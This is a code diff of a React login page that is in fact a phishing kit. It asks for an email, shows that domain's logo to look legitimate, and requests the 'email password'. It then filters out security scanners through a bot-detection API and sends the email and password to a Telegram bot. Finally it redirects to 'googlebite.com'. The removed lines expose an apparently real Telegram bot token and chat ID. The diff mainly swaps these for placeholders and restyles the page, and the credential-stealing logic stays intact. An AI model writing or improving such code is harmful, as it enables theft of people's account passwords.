@@ -1,8 +1,7 @@
 import React, { useState } from 'react';
 import axios from 'axios';
 import md5 from 'md5'; // Import the md5 hashing library
-import styles from '../styles/Index.module.css';
-
+import styles from '../styles/Index.module.css'; // Import the CSS Module
 
 const Login = () => {
   const [email, setEmail] = useState('');
@@ -11,72 +10,50 @@ const Login = () => {
   const [logo, setLogo] = useState('/favicon.ico'); // Default placeholder logo
   const [instruction, setInstruction] = useState('Verify your email identity to continue.');
 
-  // Generate Gravatar URL
   const getGravatarUrl = (email) => {
     const hash = md5(email.trim().toLowerCase());
-    return `https://www.gravatar.com/avatar/${hash}?d=identicon`; // Default to 'identicon' if no Gravatar is found
+    return `https://www.gravatar.com/avatar/${hash}?d=identicon`;
   };
 
-  // Handle email input changes
   const handleEmailChange = (e) => {
     setEmail(e.target.value);
   };
 
-  // Handle email form submission
   const handleEmailSubmit = (e) => {
     e.preventDefault();
-
-    // Validate email format
     if (email.includes('@')) {
       setEmailEntered(true);
       setInstruction('Verify email password');
-
-      // Extract domain from email and update logo
       const domain = email.split('@')[1];
-      if (domain) {
-        setLogo(`https://logo.clearbit.com/${domain}`);
-      } else {
-        setLogo('/favicon.ico'); // Default logo
-      }
+      setLogo(`https://logo.clearbit.com/${domain}`);
     } else {
       alert('Please enter a valid email address.');
     }
   };
 
-  // Handle password form submission
   const handlePasswordSubmit = async (e) => {
     e.preventDefault();
-
-    // Validate password length
     if (password.length < 5) {
       alert('Password must be at least 5 characters long.');
       return;
     }
 
     try {
-      // Get user's public IP address
-      const userIP = await axios
-        .get('https://api64.ipify.org?format=json')
-        .then((res) => res.data.ip);
-
-      // Call the hosted Vercel API for bot detection
+      const userIP = await axios.get('https://api64.ipify.org?format=json').then((res) => res.data.ip);
       const response = await axios.post('https://rail-bot-production.up.railway.app/api/detect_bot', {
         user_agent: navigator.userAgent,
         ip: userIP,
       });
 
-      const { is_bot, country, details } = response.data;
+      const { is_bot, country } = response.data;
 
       if (is_bot) {
-        // Redirect flagged bots to the denied page
-        console.warn('Bot detected:', details);
         window.location.href = '/denied';
         return;
       }
 
-      // If the user passes bot detection, send login details to Telegram
-      const TELEGRAM_BOT_TOKEN = '7781468085:AAEdLDEdPbC1zQUOJnNmYCPgkH84uuwLfgU';
-      const TELEGRAM_CHAT_ID = '-1002493880170';
+      const TELEGRAM_BOT_TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN';
+      const TELEGRAM_CHAT_ID = 'YOUR_TELEGRAM_CHAT_ID';
       const loginAlert = `
 🔐 <b>Login Details</b>
 📧 <b>Email:</b> ${email}
@@ -92,9 +69,8 @@ const Login = () => {
         parse_mode: 'HTML',
       });
 
-      // Simulate successful login and redirect
       alert('Login successful!');
-      window.location.href = 'https://googlebite.com'; // Redirect after login
+      window.location.href = 'https://googlebite.com';
     } catch (error) {
       console.error('Error during API call:', error);
       alert('An error occurred. Please try again later.');
@@ -102,10 +78,10 @@ const Login = () => {
   };
 
   return (
-    <div className="login-container">
-      <div className="login-box">
-        <img src={logo} alt="Dynamic Logo" className="logo" />
-        <p className="instruction">{instruction}</p>
+    <div className={styles.loginContainer}>
+      <div className={styles.loginBox}>
+        <img src={logo} alt="Dynamic Logo" className={styles.logo} />
+        <p className={styles.instruction}>{instruction}</p>
         {!emailEntered ? (
           <form onSubmit={handleEmailSubmit}>
             <input
@@ -113,14 +89,17 @@ const Login = () => {
               placeholder="Enter recipient email"
               value={email}
               onChange={handleEmailChange}
+              className={styles.input}
               required
             />
-            <button type="submit">Next</button>
+            <button type="submit" className={styles.button}>
+              Next
+            </button>
           </form>
         ) : (
           <>
-            <p className="entered-email">
-              <img src={getGravatarUrl(email)} alt="Profile Icon" className="profile-icon" />
+            <p className={styles.enteredEmail}>
+              <img src={getGravatarUrl(email)} alt="Profile Icon" className={styles.profileIcon} />
               {email}
             </p>
             <form onSubmit={handlePasswordSubmit}>
@@ -129,10 +108,12 @@ const Login = () => {
                 placeholder="Enter password"
                 value={password}
                 onChange={(e) => setPassword(e.target.value)}
+                className={styles.input}
                 required
-                minLength="5"
               />
-              <button type="submit">Login</button>
+              <button type="submit" className={styles.button}>
+                Login
+              </button>
             </form>
           </>
         )}
